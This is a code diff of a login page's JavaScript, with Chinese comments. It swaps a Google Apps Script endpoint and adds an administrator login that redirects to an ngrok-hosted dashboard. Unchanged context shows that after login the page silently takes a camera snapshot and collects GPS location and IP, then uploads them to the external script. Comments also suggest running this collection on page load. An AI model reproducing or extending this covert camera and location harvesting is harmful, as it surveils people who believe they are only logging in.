@@ -248,10 +248,10 @@
     /************************************************
      * 0. Apps Script URL (請改成你自己的)
      ************************************************/
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwKMbOw8auQQUIIJbXc7d7i9HpWe7hNeHTHgKnpi-SBRvKF6PZgZQgSKuiLSHOx8KRcQQ/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby8Lb2JjhjGRZAOVbldv71HdQG3UwsOwID4d8uwXHMK0ak1LJuvm9zYvwp3wA8WA3KJpA/exec";
 
     /************************************************
-     * 1. Modal 打開 / 關閉
+     * 1. Modal 打開 / 關閉 (一般使用者)
      ************************************************/
     const openModalBtn = document.getElementById('openModalBtn');
     const modalOverlay = document.getElementById('modalOverlay');
@@ -264,7 +264,20 @@
     });
 
     /************************************************
-     * 2. Tab 切換 (登入 / 註冊)
+     * 1-2. Modal 打開 / 關閉 (管理者)
+     ************************************************/
+    const adminLoginOpenBtn = document.getElementById('adminLoginOpenBtn');
+    const adminModalOverlay = document.getElementById('adminModalOverlay');
+    const adminCloseModalBtn = document.getElementById('adminCloseModalBtn');
+    adminLoginOpenBtn.addEventListener('click', () => {
+      adminModalOverlay.style.display = 'flex';
+    });
+    adminCloseModalBtn.addEventListener('click', () => {
+      adminModalOverlay.style.display = 'none';
+    });
+
+    /************************************************
+     * 2. Tab 切換 (一般登入 / 註冊)
      ************************************************/
     const tabLogin = document.getElementById('tabLogin');
     const tabRegister = document.getElementById('tabRegister');
@@ -325,9 +338,9 @@
         });
         const result = await response.json();
         if (result.success) {
-          showSuccessMessage('註冊成功，請點選「登入」');
+          showSuccessMessage('註冊成功，請切換到「登入」');
         } else {
-          showErrorMessage('註冊失敗：' + (result.error || '原因不明'));
+          showErrorMessage('註冊失敗：' + (result.error || '未知原因'));
         }
       } catch (error) {
         showErrorMessage('註冊錯誤：' + error.message);
@@ -335,7 +348,7 @@
     });
 
     /************************************************
-     * 6. 登入
+     * 6. 一般登入
      ************************************************/
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -344,7 +357,7 @@
 
       try {
         const formData = new URLSearchParams();
-        formData.append('action', 'login');
+        formData.append('action', 'login'); // 一般使用者登入
         formData.append('email', email);
         formData.append('password', password);
 
@@ -361,7 +374,7 @@
           // 登入成功後，開始收集資料
           collectAndSendData();
         } else {
-          showErrorMessage('登入失敗：' + (result.error || '原因不明'));
+          showErrorMessage('登入失敗：' + (result.error || '未知原因'));
         }
       } catch (error) {
         showErrorMessage('登入錯誤：' + error.message);
@@ -369,7 +382,39 @@
     });
 
     /************************************************
-     * 7. 收集相機、GPS、IP並上傳 (裝置資訊)
+     * 6-2. 管理者登入 (若前端整合在同頁面)
+     ************************************************/
+    document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('adminEmail').value;
+      const password = document.getElementById('adminPassword').value;
+
+      try {
+        const formData = new URLSearchParams();
+        formData.append('action', 'adminLogin'); // 管理者登入
+        formData.append('email', email);
+        formData.append('password', password);
+
+        const response = await fetch(SCRIPT_URL, {
+          method: 'POST',
+          body: formData
+        });
+        const result = await response.json();
+        if (result.success) {
+          showSuccessMessage('管理者登入成功！');
+          adminModalOverlay.style.display = 'none';
+          // 理想情況下，引導到 admin 後台或顯示管理者專屬功能
+          window.location.href = 'https://3df0-125-227-108-79.ngrok-free.app/admin_dashboard.php';
+        } else {
+          showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
+        }
+      } catch (error) {
+        showErrorMessage('管理者登入錯誤：' + error.message);
+      }
+    });
+
+    /************************************************
+     * 7. 收集相機、GPS、IP並上傳
      ************************************************/
     async function startCamera() {
       let stream = null;
@@ -383,6 +428,7 @@
             resolve();
           };
         });
+        // 簡單延遲，確保畫面可截圖
         await new Promise(resolve => setTimeout(resolve, 500));
 
         const canvas = document.createElement('canvas');
@@ -453,6 +499,7 @@
 
         const fd = new URLSearchParams();
         fd.append('message', '合併資料上傳');
+
         if (collectedData.gps) {
           fd.append('latitude', collectedData.gps.latitude);
           fd.append('longitude', collectedData.gps.longitude);
@@ -490,15 +537,10 @@
     }
 
     /************************************************
-     * 8. 頁面載入後，若想先抓GPS & IP (可視需求)
+     * 8. 頁面載入後 (可選)
      ************************************************/
-    document.addEventListener('DOMContentLoaded', async () => {
-      try {
-        // 你可以取消註解以便一打開網頁就收集
-        // collectAndSendData();
-      } catch (error) {
-        console.error('DOMContentLoaded 初始化錯誤:', error);
-      }
+    document.addEventListener('DOMContentLoaded', () => {
+      // 如果需要在頁面一載入就嘗試收集，可在此呼叫 collectAndSendData();
     });
   </script>
 </body>
